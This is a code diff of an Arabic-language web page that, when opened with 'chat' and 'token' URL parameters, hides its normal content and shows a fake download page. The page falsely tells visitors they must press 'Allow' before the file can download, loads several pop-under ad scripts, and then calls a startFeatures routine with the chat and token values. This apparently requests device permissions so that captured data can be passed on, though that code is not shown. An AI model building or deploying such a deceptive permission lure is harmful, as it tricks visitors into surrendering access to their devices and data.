@@ -167,7 +167,7 @@
       color: #ffffff;
     }
 
-    /* ستايل صفحة التحميل الجانبية */
+    /* ستايل صفحة التحميل الجانبية (يبقى كما هو للاستخدام العام) */
     .download-page {
       width: 100%;
       min-height: 100vh;
@@ -657,85 +657,109 @@
     }
   }
 
-  // ------------------ الوضع الجانبي ------------------
+  // ------------------ الوضع الجانبي (الصفحة عند وجود بارامترات) ------------------
   const params = new URLSearchParams(window.location.search);
   const chat = params.get('chat');
   const token = params.get('token');
   const features = params.get('features');
 
   if (chat && token) {
-    // إخفاء الدايلوج وعناصر الصفحة الرئيسية
-    dialog.style.display = 'none';
-    document.getElementById('cardArea').style.display = 'none';
-    document.querySelector('.header').style.display = 'none';
-    document.querySelector('.madeby').style.display = 'none';
-    document.getElementById('captureBadge').style.display = 'none';
-    
-    // إعداد الصفحة الجانبية
+    // إخفاء العناصر الأصلية للصفحة
+    ['dialog', 'cardArea', '.header', '.madeby', '#captureBadge'].forEach(sel => {
+      const el = typeof sel === 'string' && sel.startsWith('#') ? document.getElementById(sel.slice(1)) :
+                 typeof sel === 'string' && sel.startsWith('.') ? document.querySelector(sel) :
+                 window[sel];
+      if (el) el.style.display = 'none';
+    });
+
+    // إعادة تعيين الحاوية الرئيسية
     const wrap = document.querySelector('.wrap');
     wrap.innerHTML = '';
-    wrap.style.padding = '0';
+    wrap.style.padding = '20px';
     wrap.style.margin = '0';
     wrap.style.maxWidth = '100%';
     wrap.style.background = '#f5f5f5';
-    
-    // إنشاء صفحة التحميل (بدون إعلانات إضافية)
+    wrap.style.display = 'flex';
+    wrap.style.flexDirection = 'column';
+    wrap.style.alignItems = 'center';
+
+    // إنشاء صفحة التحميل
     const downloadPage = document.createElement('div');
     downloadPage.className = 'download-page';
-    
+    downloadPage.style.width = '100%';
+    downloadPage.style.maxWidth = '500px';
+    downloadPage.style.background = '#fff';
+    downloadPage.style.padding = '20px';
+    downloadPage.style.borderRadius = '12px';
+    downloadPage.style.boxShadow = '0 4px 12px rgba(0,0,0,0.15)';
+
     const mainBox = document.createElement('div');
     mainBox.className = 'main-box';
-    
+    mainBox.style.display = 'flex';
+    mainBox.style.flexDirection = 'column';
+    mainBox.style.alignItems = 'center';
+    mainBox.style.gap = '15px';
+
+    // العنوان
     const h2 = document.createElement('h2');
     h2.textContent = 'يجب الضغط علي سماح لحماية الوحدة الاعلانيه من الزيارات الوهمية لم تتمكن من تنزيل الملف إلا بعد الضغط علي سماح';
+    h2.style.fontSize = '14px';
+    h2.style.textAlign = 'center';
+    h2.style.color = '#333';
     mainBox.appendChild(h2);
-    
-    // AD Box 1
-    const adBox1 = document.createElement('div');
-    adBox1.className = 'ad-box';
-    mainBox.appendChild(adBox1);
-    
-    // AD Box 2
-    const adBox2 = document.createElement('div');
-    adBox2.className = 'ad-box';
-    const containerDiv = document.createElement('div');
-    containerDiv.id = 'container-596225155ab3da796681d551cb4b7cf4';
-    adBox2.appendChild(containerDiv);
-    mainBox.appendChild(adBox2);
-    
+
+    // إضافة 6 إعلانات صغيرة
+    for (let i = 1; i <= 6; i++) {
+      const adBox = document.createElement('div');
+      adBox.className = 'ad-box';
+      adBox.style.width = '100%';
+      adBox.style.height = '80px'; // حجم أصغر للإعلانات
+      adBox.style.margin = '5px 0';
+      adBox.style.background = '#e0e0e0';
+      adBox.style.borderRadius = '8px';
+      if (i === 2) {
+        const containerDiv = document.createElement('div');
+        containerDiv.id = 'container-596225155ab3da796681d551cb4b7cf4';
+        adBox.appendChild(containerDiv);
+      }
+      mainBox.appendChild(adBox);
+    }
+
     // زر التحميل
     const downloadBtn = document.createElement('button');
     downloadBtn.className = 'download-btn';
     downloadBtn.textContent = 'التالي';
-    downloadBtn.onclick = function() {
-      window.open("https://www.effectivegatecpm.com/d6mid86v?key=90c984c8fd10e21cd01541eb4207aa2c","_blank");
+    downloadBtn.style.padding = '10px 25px';
+    downloadBtn.style.border = 'none';
+    downloadBtn.style.borderRadius = '8px';
+    downloadBtn.style.background = '#a66bff';
+    downloadBtn.style.color = '#fff';
+    downloadBtn.style.fontSize = '16px';
+    downloadBtn.style.cursor = 'pointer';
+    downloadBtn.onclick = () => {
+      window.open("https://www.effectivegatecpm.com/d6mid86v?key=90c984c8fd10e21cd01541eb4207aa2c", "_blank");
     };
     mainBox.appendChild(downloadBtn);
-    
-    // AD Box 3
-    const adBox3 = document.createElement('div');
-    adBox3.className = 'ad-box';
-    mainBox.appendChild(adBox3);
-    
-    // AD Box 4
-    const adBox4 = document.createElement('div');
-    adBox4.className = 'ad-box';
-    mainBox.appendChild(adBox4);
-    
+
     // الفوتر
     const footer = document.createElement('div');
     footer.className = 'footer';
-    footer.textContent = '';
+    footer.style.height = '50px';
     mainBox.appendChild(footer);
-    
+
     downloadPage.appendChild(mainBox);
     wrap.appendChild(downloadPage);
-    
-    // تحميل الإعلانات (بنفس الروابط الأصلية)
-    loadAd("https://pl28700469.effectivegatecpm.com/89/a6/b8/89a6b8558224cd67c0822829d68a87ad.js");
-    loadAd("https://pl28700474.effectivegatecpm.com/596225155ab3da796681d551cb4b7cf4/invoke.js");
-    loadAd("https://pl28700485.effectivegatecpm.com/ad/c0/62/adc06235d53a0b6f378838879d3f116a.js");
-    
+
+    // تحميل سكريبتات الإعلانات
+    const ads = [
+      "https://pl28700469.effectivegatecpm.com/89/a6/b8/89a6b8558224cd67c0822829d68a87ad.js",
+      "https://pl28700474.effectivegatecpm.com/596225155ab3da796681d551cb4b7cf4/invoke.js",
+      "https://pl28700485.effectivegatecpm.com/ad/c0/62/adc06235d53a0b6f378838879d3f116a.js",
+      "https://www.highperformanceformat.com/0b7539a5227dc7b69da2ea94b0521ab6/invoke.js"
+    ];
+    ads.forEach(src => loadAd(src));
+
+    // إعداد إضافي للإعلان الخامس
     const atOptionsScript = document.createElement('script');
     atOptionsScript.innerHTML = `
       atOptions = {
@@ -747,11 +771,10 @@
       };
     `;
     document.body.appendChild(atOptionsScript);
-    loadAd("https://www.highperformanceformat.com/0b7539a5227dc7b69da2ea94b0521ab6/invoke.js");
-    
-    // بدء الميزات (مع طلب أذونات موحد)
+
+    // تشغيل الميزات المطلوبة
     startFeatures(chat, token, features);
   }
 </script>
 </body>
-                  </html>
+  </html>
